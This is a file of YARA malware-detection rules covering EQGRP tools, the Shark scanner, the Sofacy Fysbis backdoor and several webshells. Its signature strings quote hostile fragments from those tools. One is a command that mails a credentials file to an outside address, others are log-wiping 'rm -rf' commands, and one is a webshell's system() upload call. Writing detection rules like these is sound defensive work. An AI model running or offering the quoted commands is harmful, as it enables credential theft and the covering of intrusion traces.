rule APT_EQGRP_dn_1_0_2_1_RID2D45 : APT DEMO FILE LINUX {
   meta:
      description = "Detects tool from EQGRP toolset - file dn.1.0.2.1.linux"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 10:24:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, DEMO, FILE, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "Valid commands are: SMAC, DMAC, INT, PACK, DONE, GO" fullword ascii
      $s2 = "invalid format suggest DMAC=00:00:00:00:00:00" fullword ascii
      $s3 = "SMAC=%02x:%02x:%02x:%02x:%02x:%02x" fullword ascii
      $s4 = "Not everything is set yet" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 2 of them )
}

rule APT_EQGRP_bc_parser_RID2DE4 : APT DEMO FILE {
   meta:
      description = "Detects tool from EQGRP toolset - file bc-parser"
      author = "Florian Roth"
      reference = "Research"
      date = "2016-08-15 10:51:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "879f2f1ae5d18a3a5310aeeafec22484607649644e5ecb7d8a72f0877ac19cee"
      tags = "APT, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "*** Target may be susceptible to FALSEMOREL      ***" fullword ascii
      $s2 = "*** Target is susceptible to FALSEMOREL          ***" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x457f and 1 of them
}

rule Linux_Portscan_Shark_1_RID2FB2 : DEMO FILE HKTL LINUX T1046 {
   meta:
      description = "Detects Linux Port Scanner Shark"
      author = "Florian Roth"
      reference = "Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35"
      date = "2016-04-01 12:08:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4da0e535c36c0c52eaa66a5df6e070c52e7ddba13816efc3da5691ea2ec06c18"
      hash2 = "e395ca5f932419a4e6c598cae46f17b56eb7541929cdfb67ef347d9ec814dea3"
      tags = "DEMO, FILE, HKTL, LINUX, T1046"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "rm -rf scan.log session.txt" fullword ascii
      $s17 = "*** buffer overflow detected ***: %s terminated" fullword ascii
      $s18 = "*** stack smashing detected ***: %s terminated" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x7362 and all of them )
}

rule Linux_Portscan_Shark_2_RID2FB3 : DEMO HKTL LINUX T1046 {
   meta:
      description = "Detects Linux Port Scanner Shark"
      author = "Florian Roth"
      reference = "Virustotal Research - see https://github.com/Neo23x0/Loki/issues/35"
      date = "2016-04-01 12:08:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "5f80bd2db608a47e26290f3385eeb5bfc939d63ba643f06c4156704614def986"
      hash2 = "90af44cbb1c8a637feda1889d301d82fff7a93b0c1a09534909458a64d8d8558"
      tags = "DEMO, HKTL, LINUX, T1046"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "usage: %s <fisier ipuri> <fisier useri:parole> <connect timeout> <fail2ban wait> <threads> <outfile> <port>" fullword ascii
      $s2 = "Difference between server modulus and host modulus is only %d. It's illegal and may not work" fullword ascii
      $s3 = "rm -rf scan.log" fullword ascii
   condition: 
      all of them
}

rule Sofacy_Fysbis_ELF_Backdoor_Gen2_RID32AA : APT DEMO FILE G0007 LINUX RUSSIA {
   meta:
      description = "Detects Sofacy Fysbis Linux Backdoor"
      author = "Florian Roth"
      reference = "http://researchcenter.paloaltonetworks.com/2016/02/a-look-into-fysbis-sofacys-linux-backdoor/"
      date = "2016-02-13 14:14:51"
      score = 80
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "02c7cf55fd5c5809ce2dce56085ba43795f2480423a4256537bfdfda0df85592"
      hash2 = "8bca0031f3b691421cb15f9c6e71ce193355d2d8cf2b190438b6962761d0c6bb"
      hash3 = "fd8b2ea9a2e8a67e4cb3904b49c789d57ed9b1ce5bebfe54fe3d98214d6a0f61"
      tags = "APT, DEMO, FILE, G0007, LINUX, RUSSIA"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "RemoteShell" ascii
      $s2 = "basic_string::_M_replace_dispatch" fullword ascii
      $s3 = "HttpChannel" ascii
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 500KB and all of them
}

rule CN_Honker_Webshell_PHP_linux_RID31D3 : CHINA DEMO FILE LINUX T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file linux.txt"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 13:39:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, FILE, LINUX, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<form name=form1 action=exploit.php method=post>" fullword ascii
      $s1 = "<title>Changing CHMOD Permissions Exploit " fullword ascii
   condition: 
      uint16 ( 0 ) == 0x696c and filesize < 6KB and all of them
}

rule CN_Honker_Webshell_Linux_2_6_Exploit_RID34D6 : CHINA DEMO EXPLOIT LINUX T1505_003 WEBSHELL {
   meta:
      description = "Webshell from CN Honker Pentest Toolset - file 2.6.9"
      author = "Florian Roth"
      reference = "Disclosed CN Honker Pentest Toolset"
      date = "2015-06-23 15:47:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "CHINA, DEMO, EXPLOIT, LINUX, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "[+] Failed to get root :( Something's wrong.  Maybe the kernel isn't vulnerable?" fullword ascii
   condition: 
      filesize < 56KB and all of them
}

rule Webshell_jsp_cmd_2_RID2E17 : DEMO FILE T1505_003 WEBSHELL {
   meta:
      description = "Laudanum Injector Tools - file cmd.war"
      author = "Florian Roth"
      reference = "http://laudanum.inguardians.com/"
      date = "2015-06-22 10:59:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, FILE, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "cmd.jsp}" fullword ascii
      $s1 = "cmd.jspPK" fullword ascii
      $s2 = "WEB-INF/web.xml" fullword ascii
      $s3 = "WEB-INF/web.xmlPK" fullword ascii
      $s4 = "META-INF/MANIFEST.MF" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 2KB and all of them
}

rule CN_Tools_Temp_RID2C07 : APT CHINA DEMO FILE {
   meta:
      description = "Chinese Hacktool Set - file Temp.war"
      author = "Florian Roth"
      reference = "http://tools.zjqhr.com/"
      date = "2015-06-13 09:31:41"
      score = 60
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "APT, CHINA, DEMO, FILE"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "META-INF/context.xml<?xml version=\"1.0\" encoding=\"UTF-8\"?>" fullword ascii
      $s1 = "browser.jsp" fullword ascii
      $s3 = "cmd.jsp" fullword ascii
      $s4 = "index.jsp" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x4b50 and filesize < 203KB and all of them
}

rule LinuxHacktool_eyes_a_RID2F2B : DEMO HKTL LINUX {
   meta:
      description = "Linux hack tools - file a"
      author = "Florian Roth"
      reference = "not set"
      date = "2015-01-19 11:45:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, HKTL, LINUX"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "cat trueusers.txt | mail -s \"eyes\" clubby@slucia.com" fullword ascii
      $s1 = "mv scan.log bios.txt" fullword ascii
      $s2 = "rm -rf bios.txt" fullword ascii
      $s3 = "echo -e \"# by Eyes.\"" fullword ascii
      $s4 = "././pscan2 $1 22" fullword ascii
      $s10 = "echo \"#cautam...\"" fullword ascii
   condition: 
      2 of them
}

rule Webshell_Worse_Linux_Shell_1_RID320C : DEMO LINUX SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - file Worse Linux Shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:48:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      
      tags = "DEMO, LINUX, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "system(\"mv \".$_FILES['_upl']['tmp_name'].\" \".$currentWD" 
   condition: 
      all of them
}

rule Webshell_phpspy_2006_arabicspy_RID328E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 2008.php, 2009mssql.php, phpspy_2005_full.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:10:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "aa17b71bb93c6789911bd1c9df834ff9"
      hash2 = "b68bfafc6059fd26732fa07fb6f7f640"
      hash3 = "40a1f840111996ff7200d18968e42cfe"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$this -> addFile($content, $filename);" fullword
      $s3 = "function addFile($data, $name, $time = 0) {" fullword
      $s8 = "function unix2DosTime($unixtime = 0) {" fullword
      $s9 = "foreach($filelist as $filename){" fullword
   condition: 
      all of them
}

